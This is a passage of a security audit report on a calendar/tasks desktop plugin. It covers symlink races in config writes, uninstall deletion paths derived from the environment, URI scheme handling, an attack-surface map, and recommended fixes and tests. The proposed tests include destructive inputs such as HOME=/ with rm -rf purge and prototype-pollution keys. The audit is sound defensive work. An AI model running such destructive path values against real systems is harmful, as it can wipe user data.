**Attacker capability:** Ability to race the writer or create the predictable temporary file.

**Attack path:**

```text
save_config()
  -> fixed config.json.tmp
  -> os.open(... O_CREAT|O_TRUNC ...)
  -> write
  -> replace(target)

_write_timer()
  -> fixed parm.clock-sync.timer.tmp
  -> write_text()
  -> replace(TIMER_PATH)
```

**Why it is vulnerable:**

- `save_config()` uses a predictable `.json.tmp` path without `O_EXCL`.
- `_write_timer()` uses a predictable `.timer.tmp` path and does not set restrictive permissions.
- Neither temp path is created with a unique random name.
- The code does not use `O_NOFOLLOW` or equivalent protections.
- Concurrent writers can overwrite each other’s temporary data.
- A symlink or replacement race can redirect writes to another file writable by the user.

**Concrete exploit scenario:**

A same-user process races `save_config()` by replacing `config.json.tmp` with a symlink to another user-owned file. The plugin writes configuration data into the redirected target. A similar race can alter the generated systemd unit.

**Impact:**

- User-owned file corruption.
- Configuration manipulation.
- Systemd user-service command/configuration manipulation.
- Potential user-level persistence if the generated unit is redirected.

This does not directly cross to root because the affected process is user-level.

**Existing mitigation:**

- The target config file is atomically replaced.
- The final config file is mode `0600`.
- The state writer uses unique per-process temp names.
- The config directory is intended to be mode `0700`.

**Why the mitigation is insufficient:**

The config and timer writers do not receive the same unique-temp and no-follow protections already used by `atomic_write()`.

**Recommended fix:**

Use unique files created with restrictive mode and exclusive creation, preferably in the same directory, then atomically rename. Reject symlinked targets and use `O_NOFOLLOW` where available. Apply the same implementation pattern to config and timer writes.

**Would the fix be breaking:** No.

## D. Low Findings

### SEC-008

**Title:** Uninstall and purge operations trust environment-derived deletion paths  
**Severity:** Low  
**Confidence:** High

**Affected file:** `scripts/uninstall.sh`  
**Affected function/section:** Path initialization and `main()` purge branches  
**Approximate line:** 29-34, 90-139, 141-172

**Attack precondition:** An attacker controls `HOME`, `XDG_CONFIG_HOME`, or `XDG_STATE_HOME` in the environment of the uninstall process, or can race path components during deletion.

**Attacker capability:** Ability to influence the environment or filesystem namespace of the user-level uninstall process.

**Attack path:**

```text
XDG_CONFIG_HOME / XDG_STATE_HOME / HOME
  -> CONFIG_DIR / STATE_DIR / SHELL_JSON
  -> rm -rf or jq/mv
```

**Why it is vulnerable:**

The script derives deletion targets directly from environment variables:

```bash
STATE_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/parm.clock"
CONFIG_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/parm.clock"
SHELL_JSON="$HOME/.config/omarchy/shell.json"
```

The purge branches then use `rm -rf` and replacement operations without verifying that the resulting paths remain inside expected user configuration/state roots.

**Concrete exploit scenario:**

A malicious wrapper launches uninstall with `XDG_STATE_HOME` set to a directory containing unrelated user data. Running with `--purge-data` deletes the resulting `parm.clock` directory. A manipulated `HOME` changes the shell configuration path and credential paths.

**Impact:**

- User-level data loss.
- Deletion of unrelated user files if environment variables are manipulated.
- Incorrect credential/configuration removal.

**Existing mitigation:**

- Paths are quoted.
- Purge operations require explicit flags.
- Package/credential removals prompt unless `--yes` is supplied.
- The script does not claim to delete Google server data.
- `rm -rf` targets a fixed suffix such as `parm.clock`.

**Why the mitigation is insufficient:**

`--purge-data`, `--purge-all`, and `--yes` make destructive actions intentional but do not validate the path origin or protect against a manipulated environment.

**Recommended fix:**

Validate `HOME` and XDG roots, reject empty/root-like or unexpected paths, canonicalize safely, and require the target to be an expected directory owned by the current user before recursive deletion.

**Would the fix be breaking:** No for normal installations.

---

### SEC-009

**Title:** Setup config heredoc follows an existing symlink at `config.json`  
**Severity:** Low  
**Confidence:** High

**Affected file:** `scripts/setup.sh`  
**Affected function/section:** `write_config()`  
**Approximate line:** 297-334

**Attack precondition:** `CONFIG_FILE` is a symlink or is replaced by a symlink between the existence check and the shell redirection.

**Attacker capability:** Ability to modify the user’s config directory concurrently. Normally this is same-user access.

**Attack path:**

```text
[[ -f "$CONFIG_FILE" ]]
  -> race/replacement
cat > "$CONFIG_FILE"
  -> follows symlink
```

**Why it is vulnerable:**

The script checks whether the file exists, then later performs:

```bash
cat > "$CONFIG_FILE"
```

Shell redirection follows symlinks. There is no atomic exclusive creation or no-follow check.

**Concrete exploit scenario:**

A same-user process replaces `config.json` with a symlink to another user-owned file between the check and the heredoc write. Setup overwrites that target with plugin configuration.

**Impact:**

- User-owned file corruption.
- Configuration injection or loss.

**Existing mitigation:**

- The configuration directory is set to `0700`.
- The final file is chmodded to `0600`.
- Existing config files are normally left untouched.

**Why the mitigation is insufficient:**

The check/write sequence remains raceable, and chmod is applied to the symlink target on systems where the shell follows the link during redirection.

**Recommended fix:**

Create the file atomically with exclusive creation and no-follow semantics, or write a unique temporary file and rename it after validating the target.

**Would the fix be breaking:** No.

---

### SEC-010

**Title:** User-clicked remote URI handling permits external side effects beyond Calendar navigation  
**Severity:** Low  
**Confidence:** High

**Affected file:** `Panel.qml`  
**Affected function/section:** `openEventLink()`  
**Approximate line:** 241-257

**Attack precondition:** A user clicks an event link button for an event containing an attacker-controlled or untrusted URI.

**Attacker capability:** Ability to create or control a Calendar event visible to the victim.

**Attack path:**

```text
Google event conferenceData/htmlLink
  -> normalize_event()
  -> state.json
  -> QML event row
  -> openEventLink()
  -> Qt.openUrlExternally()
```

**Why it is vulnerable:**

The allowlist includes:

```text
https:
http:
meet:
zoommtg:
tel:
mailto:
```

A Calendar attendee or shared-calendar participant may be able to control event metadata or conference entry points. Opening `tel:` or `mailto:` can invoke external applications and cause side effects. HTTP links can navigate to attacker-controlled sites.

This requires an explicit user click and is not silent code execution.

**Concrete exploit scenario:**

An attacker creates a shared-calendar event with a `mailto:` URI or a URL resembling a trusted meeting link. The victim clicks “Open in Calendar”; the desktop mail, phone, Zoom, or browser handler is invoked.

**Impact:**

- Phishing.
- External application invocation.
- Potential unintended communication or call initiation depending on desktop handlers.
- Privacy leakage to the opened site/application.

**Existing mitigation:**

- No shell execution is used.
- URI schemes are restricted.
- URI strings are length-capped.
- The UI labels the action as opening the event link.

**Why the mitigation is insufficient:**

Scheme allowlisting does not establish destination trust. `http`, `mailto`, `tel`, and third-party application schemes remain externally actionable.

**Recommended fix:**

Prefer only HTTPS links to approved Google domains, or show the full destination and require an additional confirmation for non-Google and side-effect-capable schemes.

**Would the fix be breaking:** Yes for users relying on Meet, Zoom, telephone, or mail links.

## E. Security Strengths Already Present

- `subprocess.Popen()` in `gws_adapter.py` receives an argv list and does not invoke a shell.
- QML mutation commands use `Process.command` arrays rather than concatenated shell strings.
- `Panel.qml:shellQuote()` correctly quotes the sync path for the one command passed to `bar.run()`.
- User-entered event titles, locations, task titles, dates, and IDs do not become shell syntax.
- `gws` parameters and request bodies are JSON-serialized as separate argv values.
- `gws_adapter.py` applies a per-stream 16 MiB output cap.
- `gws_adapter.py` applies page and item caps.
- State fields are length-capped in `schema.py`.
- The state document has a 4 MiB serialized size ceiling.
- QML state reads are bounded through `head -c`.
- QML text rendering uses `Text.PlainText` for Google-controlled titles, locations, task titles, and error messages.
- State writes use private directory/file modes and atomic replacement.
- The state writer uses unique per-process temporary names.
- Last-good state is preserved on authentication/API failures.
- OAuth tokens are not directly parsed or stored by this repository.
- OAuth-related local credential deletion is explicit and documented.
- CRUD IDs are passed as arguments, not interpolated into shell commands.
- Date and time inputs are validated before event creation.
- Task status is constrained to `needsAction` and `completed`.
- URL scheme validation prevents direct use of arbitrary schemes such as `javascript:`, `file:`, or `data:`.
- The systemd unit runs as a user service rather than requesting root privileges.
- The plugin does not delete Google server-side events/tasks during uninstall.

## F. Attack-Surface Map

### 1. Installation and dependency boundary

```text
User / shell environment
  -> setup.sh
  -> PATH-resolved python3, gcloud, gws, npm, cargo, yay, pacman, sudo
  -> npm registry / Cargo Git repository / AUR / package mirrors
  -> installed executables
```

Trust assumptions:

- PATH is trusted.
- Package sources are trusted.
- Package managers resolve trusted artifacts.
- The selected `gws` is the intended binary.

Primary risks:

- Malicious PATH executable.
- Supply-chain compromise.
- AUR build-script compromise.
- Package replacement.

### 2. OAuth boundary

```text
setup.sh
  -> gws auth setup --project PROJECT
  -> gws auth login --services calendar,tasks
  -> browser consent
  -> gws credential store/keyring
```

Trusted:

- `gws` executable.
- GCP project selected by the user.
- OAuth consent screen.

Untrusted or user-controlled:

- `PROJECT`.
- `gws` selected from PATH/config.
- Browser/account context.
- GCP project ownership and OAuth client configuration.

Primary risks:

- Malicious executable intercepting login.
- Broad Calendar/Tasks authorization.
- User consenting to the wrong project/client if the executable or project is manipulated.

### 3. Google API to gws boundary

```text
Google APIs
  -> gws JSON stdout/stderr
  -> gws_adapter.py
```

Trusted:

- JSON shape promised by `gws`.
- Google API schema.

Untrusted:

- Shared-calendar event fields.
- Task/calendar names and free text.
- IDs and pagination tokens.
- CLI output if `gws` is compromised.

Validation:

- JSON parse.
- Output byte cap.
- Pagination/page/item caps.
- Partial normalization and field caps.

Gaps:

- Incomplete type validation before normalization.
- Unvalidated IDs.
- Unexpected nested objects can raise uncaught exceptions.

### 4. gws/Python to state boundary

```text
gws_adapter.py
  -> sync.py
  -> schema.normalize_*
  -> validate_state()
  -> fit_state_bytes()
  -> atomic_write()
  -> state.json
```

Trusted:

- Normalized state shape.

Untrusted:

- Raw API fields.
- Response cardinality.
- String lengths and nested types.

Validation:

- Free-text caps.
- State schema validation.
- 4 MiB serialized size cap.
- Atomic private write.

Gaps:

- Normalization occurs before complete type validation.
- IDs are not consistently bounded or typed.
- Malformed records can crash before state validation.

### 5. state.json to QML

```text
state.json
  -> ClockStateFile.qml
  -> bounded head read
  -> Model.parseState()
  -> eventIndex/grouping
  -> QML rendering
```

Trusted:

- State writer output.

Untrusted:

- Any local process capable of modifying the state file.
- Existing stale/corrupt state.
- Google-controlled strings within state.

Validation:

- Read size cap.
- JSON parse.
- Array fallback.
- Plain-text rendering.
- Writer-side schema validation.

Gaps:

- QML `parseState()` does not fully validate the schema.
- A manually malicious state file could trigger JavaScript object-key hazards or pathological date/index behavior.
- This is primarily a same-user local attack and does not cross a privilege boundary.

### 6. QML/user input to Python/gws

```text
QML forms
  -> Panel.qml
  -> Process.command argv array
  -> mutate.py argparse
  -> input validation
  -> JSON request body/params
  -> gws
  -> Google Calendar/Tasks
```

Trusted:

- User intentionally submitting a form.
- Current authenticated account.

Untrusted:

- Event title.
- Event location.
- Quick-add text.
- Dates/times.
- Task title/due date.
- Cached calendar/task-list IDs.

Validation:

- Empty titles rejected.
- Dates and times validated.
- Arguments passed without shell interpretation.
- JSON request serialization.

Gaps:

- Calendar/task identifiers are taken from state and are not revalidated against current server discovery.
- No confirmation for delete.
- No stale-state or target-identity check before mutation.
- No event edit UI is currently wired despite the README claiming full event CRUD.

### 7. Uninstall/systemd boundary

```text
User
  -> uninstall.sh
  -> systemctl --user
  -> generated user unit
  -> python3 sync.py
  -> gws
```

Trusted:

- User unit directory.
- Generated paths.
- PATH-resolved `systemctl`, `omarchy`, `gws`, package tools.

Untrusted:

- Environment-derived paths.
- Installation directory names.
- Concurrent filesystem changes.
- User unit contents if another process can modify them.

Primary risks:

- Path parsing/escaping.
- Recursive deletion of environment-derived paths.
- User-level persistence or state corruption.

## G. Top 10 Fixes Ranked by Risk Reduction

1. Establish a verified dependency installation path using signed or hash-pinned artifacts.
2. Remove heuristic `gws` identity checks and verify the executable’s signature/checksum.
3. Eliminate or strictly validate arbitrary `gwsPath` overrides.
4. Use a fixed minimal PATH and absolute tool paths for setup.
5. Validate every API item and nested object before normalization.
6. Enforce string/length constraints on all IDs before deduplication, indexing, or subprocess calls.
7. Add an aggregate API-call and calendar/task-list budget.
8. Generate systemd units with proper systemd escaping and verify them with `systemd-analyze verify`.
9. Replace predictable config/timer temporary files with unique exclusive temporary files and no-follow protections.
10. Add confirmation and stale-target checks for delete and mutation operations.

## H. Questions Requiring Manual Testing

1. What exact OAuth scopes does `gws auth login --services calendar,tasks` request?
2. Does the CLI grant write access to every visible calendar/task list or only selected resources?
3. Where exactly does `gws` store tokens and client secrets, and what are their actual file/keyring permissions?
4. Does `gws auth setup` ever print client secrets, refresh tokens, or sensitive project details to stdout/stderr?
5. Does `gws` inherit all environment variables, including proxy credentials and debug variables?
6. How does `systemd` parse generated `ExecStart` paths containing spaces, `%`, backslashes, quotes, or newlines?
7. Does `systemctl --user enable --now` accept and persist a generated unit if it contains malformed path syntax?
8. Can a shared-calendar event produce arbitrary `conferenceData.entryPoints[].uri` values?
9. What desktop handlers are registered for `tel:`, `mailto:`, `zoommtg:`, and `meet:`?
10. Can Google API responses contain non-object entries in `items` under failure or partial-response conditions?
11. What is the practical maximum number of calendars and task lists supported by the Google APIs?
12. Does the timer ever overlap with a previous invocation despite `OnUnitActiveSec` and the post-write refresh?
13. Can another user access or alter the configured user unit/state/config directories under the target Omarchy defaults?
14. Does Omarchy’s `bar.run()` invoke a shell, and if so, is `shellQuote()` interpreted exactly as expected?
15. Does `omarchy plugin remove parm.clock --yes` execute any plugin-provided lifecycle code?
16. Are npm package dependencies pinned to immutable integrity hashes in the published artifact?
17. Is the Cargo Git revision guaranteed to correspond to the claimed release and reviewed source?
18. Does yay build `google-cloud-cli` in a way that executes arbitrary AUR recipe code before privilege escalation?
19. What happens if the keyring backend returns unusually large or sensitive diagnostics?
20. Does the QML `FileView` watcher expose or retain file contents despite `preload: false`?

## I. Security Tests to Add

- Test malicious `PATH` entries containing fake `gws`, `python3`, `systemctl`, and package tools.
- Test `gwsPath` values pointing to non-executable files, directories, symlinks, writable wrappers, and files owned by another user.
- Test malformed gws records:
  - `items` containing strings, arrays, and nulls.
  - `id` values containing objects, arrays, and very large strings.
  - `start`/`end` values with wrong types.
  - `status` and `completed` values with wrong types.
- Test malformed pagination tokens and endless pagination with total-call limits.
- Test a very large number of calendars/task lists and confirm bounded total work.
- Test API responses containing 16 MiB-plus stdout and stderr independently.
- Test generated systemd paths containing spaces, `%`, quotes, backslashes, and newline characters.
- Run `systemd-analyze verify` against generated units in a temporary home.
- Test concurrent `save_config()` calls and concurrent `apply_interval.py` calls.
- Test symlink replacement races against config, timer, state, and temporary files.
- Test uninstall with:
  - `HOME=/`
  - `HOME` containing spaces
  - `XDG_CONFIG_HOME=/tmp/other`
  - `XDG_STATE_HOME=/tmp/other`
  - symlinked target directories
- Test shell.json replacement while uninstall is running.
- Test QML parsing of hostile state keys such as `__proto__`, `constructor`, and `prototype`.
- Test QML parsing of valid-but-pathological date ranges and high item counts.
- Test all URI schemes and confirm no automatic action occurs without a click/confirmation.
- Test event/task mutation using stale IDs after deletion or list changes.
- Test delete actions for wrong calendar/task-list IDs.
- Test OAuth scope contents in a controlled GCP project.
- Test that no token, refresh token, client secret, or authorization code appears in setup logs, systemd journal, QML error text, or temporary files.
- Test package provenance and verify installed `gws` against an expected checksum/signature.

## J. Things That SHOULD NOT Be Changed

The following design choices are already security-positive and should be preserved:

- Do not replace argv-based subprocess execution with shell command strings.
- Do not remove the gws output cap.
- Do not remove pagination and item limits.
- Do not remove the state byte ceiling.
- Do not use unbounded `FileView` reads for `state.json`.
- Do not render Google-controlled text as rich text or AutoText.
- Do not open arbitrary URI schemes.
- Do not remove atomic state replacement.
- Do not weaken state/config directory and file permissions.
- Do not overwrite a valid last-good state after a transient sync or authentication failure.
- Do not make uninstall delete Google Calendar events or Tasks.
- Do not silently broaden mutation targets beyond the selected calendar/task list.
- Do not move OAuth token handling into this plugin when `gws` already owns that responsibility.
- Do not remove date/time validation from `mutate.py`.
- Do not remove the single-flight mutation guard in `Panel.qml`.

## Overall Conclusion

The repository is not vulnerable to the obvious shell-injection path: user-entered titles, locations, task text, IDs, and JSON values are passed through structured argv and JSON serialization. The strongest remaining issue is the trust placed in external executable and package provenance. A malicious or substituted `gws` can receive the user’s OAuth/API authority, and the installer currently has no cryptographic mechanism to distinguish the intended binary from a lookalike.

The next most important improvements are validating malformed API data before normalization, bounding aggregate synchronization work, hardening generated systemd/config writes, and verifying executable identity rather than relying on PATH and spoofable help output.
